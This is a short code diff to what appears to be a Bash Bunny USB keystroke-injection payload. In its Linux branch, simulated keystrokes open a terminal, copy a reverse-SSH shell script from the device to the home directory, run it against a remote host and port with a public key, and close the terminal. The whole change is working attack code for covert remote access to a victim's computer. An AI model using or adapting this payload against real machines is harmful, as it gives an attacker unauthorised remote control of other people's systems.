@@ -87,11 +87,14 @@ if [ "$OS" = "WIN" ]; then
     LED FINISH
     exit 0
 elif [ "$OS" = "LINUX" ]; then
-    RUN LINUX bash ((lsblk -l | grep BashBunny | cut -d' ' -f7)+'/payloads/library/RemoteAccess/ReverseSSH/LinuxSSH-RShell.sh') $RHOST $RPORT $PUBKEY
+    Q CTRL-ALT t
+    sleep 1
+    Q STRING "cp \$(readlink -f /dev/disk/by-label/BashBunny | while read dev;do mount | grep \"\$dev\b\" | awk '{print \$3}';done)/payloads/library/RemoteAccess/ReverseSSH/LinuxSSH-RShell.sh ~/rshell.sh"
+    Q ENTER
+    Q STRING "chmod +x ~/rshell.sh && ~/rshell.sh $RHOST $RPORT '$PUBKEY'"
+    Q ENTER
+    Q STRING "exit"
+    Q ENTER
     LED FINISH
     exit 0
 fi
-
-
-
-LED FINISH
